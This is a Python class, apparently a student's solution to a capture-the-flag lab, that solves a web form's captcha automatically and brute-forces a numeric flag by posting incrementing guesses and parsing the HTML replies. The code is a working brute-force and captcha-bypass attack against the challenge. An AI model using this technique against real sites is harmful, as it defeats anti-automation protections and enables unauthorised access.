import requests
import re
from bs4 import BeautifulSoup
from src.tp3.utils.config import logger
from src.tp3.utils.captcha import Captcha

class Session:
    """
    Class representing a session to solve a captcha and submit a flag.
    """

    def __init__(self, url):
        self.url = url
        self.captcha_value = ""
        self.flag_guess = 1000
        self.final_flag_buffer = ""
        self.response_bucket = ""
        
        self.http_sess = requests.Session()

    def prepare_request(self):
        """
        Prepares the request for sending by capturing and solving the captcha.
        """
        captcha = Captcha(self.url, self.http_sess)
        captcha.capture()
        captcha.solve()

        self.captcha_value = captcha.get_value()
        logger.info(f"captcha lu : {self.captcha_value} | flag tester : {self.flag_guess}")

    def submit_request(self):
        """
        Sends the flag and captcha.
        """
        current_try_payload = {
            "flag": str(self.flag_guess),
            "captcha": self.captcha_value,
            "submit": "Envoyer",
        }

        resp = self.http_sess.post(self.url, data=current_try_payload)
        self.response_bucket = resp.text

    def process_response(self):
        """
        Processes the response.
        """
        html_soupe_zone = BeautifulSoup(self.response_bucket, "html.parser")
        
        success_zone = html_soupe_zone.find("p", class_="alert-success")
        if success_zone:
            raw_success = success_zone.get_text(strip=True)
            flag_match = re.search(r"(FLAG-?\d*\{[^}]+\})", raw_success)
            if flag_match:
                self.final_flag_buffer = flag_match.group(1)
            else:
                self.final_flag_buffer = raw_success
            logger.info(f"ça a l'air ok. flag_value={self.flag_guess}")
            return True

        raw_answer_zone = html_soupe_zone.get_text()
        
        if re.search(r"(?<!In)(?<!in)Correct", raw_answer_zone):
            flag_match = re.search(r"(FLAG-?\d*\{[^}]+\})", raw_answer_zone)
            if flag_match:
                self.final_flag_buffer = flag_match.group(1)
            else:
                self.final_flag_buffer = raw_answer_zone.strip()
            logger.info(f"ça a l'air ok . flag_value={self.flag_guess}")
            return True

        alert_zone = html_soupe_zone.find("p", class_="alert-danger")

        if alert_zone:
            msg = alert_zone.get_text(strip=True).lower()

            if "captcha" in msg:
                logger.warning("captcha non valide , on retente..")
                return False

            if "flag" in msg:
                logger.info(f"flag {self.flag_guess} incorrect , next..")
                self.flag_guess += 1
                return False

        logger.warning(f"reponse non reconnue , flag {self.flag_guess}, ça continue...")
        self.flag_guess += 1
        return False

    def get_flag(self):
        """
        Returns the valid flag.

        Returns:
            str: The valid flag.
        """
        return self.final_flag_buffer
